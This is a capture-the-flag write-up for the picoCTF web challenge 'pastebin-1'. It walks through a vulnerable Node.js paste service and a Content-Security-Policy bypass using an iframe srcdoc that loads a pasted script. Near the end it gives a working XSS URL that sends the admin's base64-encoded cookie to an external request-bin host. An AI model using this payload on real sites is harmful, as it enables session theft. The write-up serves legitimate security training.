# pastebin-1
Web

# Solution

We receive the source code for a pastebin-like service:

```javascript
const http = require('http')

const pageNew = `<!doctype html>
<h3>make a new paste</h3>
<form>
  <textarea name="paste"></textarea>
  <br>
  <input type="submit">
</form>
<div id="error"></div>
<script>error.innerHTML=decodeURIComponent(location.hash.slice(1))</script>
`

http.createServer((req, res) => {
  if (req.method !== 'GET') {
    return res.writeHead(405).end()
  }
  const [pathname, query] = req.url.split('?', 2)
  const paste = new URLSearchParams(query).get('paste')
  const sendMsg = msg => res.writeHead(302, { location: `/#${encodeURIComponent(msg)}` }).end()
  if (pathname !== '/') {
    return sendMsg('error: unknown path')
  }
  if (!paste) {
    return res.writeHead(200, {
      'content-type': 'text/html',
      'content-security-policy': 'default-src \'none\'; script-src \'self\' \'sha256-a857n1MW8s/5S6R7Gyc+gFaD9SwMs5eEheAroy0rzWw=\''
    }).end(pageNew)
  }
  res.writeHead(200, {
    'content-type': 'text/html',
    'content-security-policy': 'default-src \'none\''
  }).end(paste)
}).listen(3000, () => console.log('listening'))
```

The service allows pasting text and then reading it back.

We also get an additional webpage where we can report a link to an admin and have him visit the link. This usually means that we need to use XSS to cause admin to execute some malicious code (usually leak us his cookie).

As we can see from the source code, our paste gets posted as-is without any sanitization:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/pastebin-1]
└─$ curl 'https://pastebin-1.mars.picoctf.net/?paste=test'
test
```

So, we can just go ahead and submit Javascript code:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/pastebin-1]
└─$ curl 'https://pastebin-1.mars.picoctf.net/?paste=<script>alert(1)</script>'
<script>alert(1)</script>
```

Since the service supports GET requests, it's very easy to share such links which contain Javascript code. The only problem, of course, is the CSP:

```javascript
  res.writeHead(200, {
    'content-type': 'text/html',
    'content-security-policy': 'default-src \'none\''
  }).end(paste)
```

A CSP of `default-src 'none'` blocks any script execution, so even if someone visits `'https://pastebin-1.mars.picoctf.net/?paste=<script>alert(1)</script>'` they won't see any alert popping up. Therefore, we will need to continue looking for an entry vector.

As we can see, if the current request doesn't contain a paste, the CSP is a bit more permissive:

```javascript
  if (!paste) {
    return res.writeHead(200, {
      'content-type': 'text/html',
      'content-security-policy': 'default-src \'none\'; script-src \'self\' \'sha256-a857n1MW8s/5S6R7Gyc+gFaD9SwMs5eEheAroy0rzWw=\''
    }).end(pageNew)
  }
```

In this case, `script-src` is set to `self` (which means scripts from the same origin are accepted) and `sha256-a857n1MW8s/5S6R7Gyc+gFaD9SwMs5eEheAroy0rzWw=` (which means that scripts that have the given SHA256 signature are accepted). The SHA256 signature is here to allow the following script, which is embedded into the page:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/pastebin-1]
└─$ echo -n "error.innerHTML=decodeURIComponent(location.hash.slice(1))" | sha256sum | awk '{ printf $1 }' | xxd -p -r | base64
a857n1MW8s/5S6R7Gyc+gFaD9SwMs5eEheAroy0rzWw=
```

Since we won't be able to find a collision which matches the same hash, we need to concentrate on the `script-src 'self'` part. We already know that we can create any Javascript code we want using the `paste` parameter, so we should probably look for a way to get it executed in the context of the main page.

Notice the the main page has the following code:

```html
<div id="error"></div>
<script>error.innerHTML=decodeURIComponent(location.hash.slice(1))</script>
```

This means that for a given URL, anything after the `#` sign will be rendered as HTML. So, for example, we can access `https://pastebin-1.mars.picoctf.net/#%3Cb%3Etest%3C/b%3E` and get the following HTML code:

```html
<html><head></head><body><h3>make a new paste</h3>
<form>
  <textarea name="paste"></textarea>
  <br>
  <input type="submit">
</form>
<div id="error"><b>test</b></div>
<script>error.innerHTML=decodeURIComponent(location.hash.slice(1))</script>
</body></html>
```

Of course, we, can't use a `<script>` tag since it won't get executed due to the CSP policy. However, using [these CSP bypass guidelines](https://brutelogic.com.br/blog/csp-bypass-guidelines/) we arrive to [this tweet](https://twitter.com/brutelogic/status/1359146022149251073) which contains:

> #XSS vector for when you need to call a script to bypass some "script-src" CSP directive in a DOM-based scenario.
> 
> `<Iframe SrcDoc="<Script Src=URL></Script>">`

Here's a proof of concept which pops up an alert:

```
https://pastebin-1.mars.picoctf.net/#<Iframe SrcDoc="<Script Src=https://pastebin-1.mars.picoctf.net/%3fpaste=alert`1`></Script>">
```

We just need to extend this by creating a request bin and leaking the admin cookie:

```
https://pastebin-1.mars.picoctf.net/#%3CIframe%20SrcDoc=%22%3CScript%20Src=https://pastebin-1.mars.picoctf.net/%3fpaste=window.open(`https://enpma6yaxzylc.x.pipedream.net/`.concat(btoa(document.cookie)))%3E%3C/Script%3E%22%3E
```

This uses the same infrastructure as the `alert` from the PoC, but instead of calling `alert` we trigger a request to our request-bin, to which we append the cookie: 

```javascript
window.open(`https://enpma6yaxzylc.x.pipedream.net/`.concat(btoa(document.cookie)))
```

We send the link to the admin and after a few moments receive the flag:

```
flag=picoCTF{c0nt3nt_s3curity_p0licy_is_c00l}
```
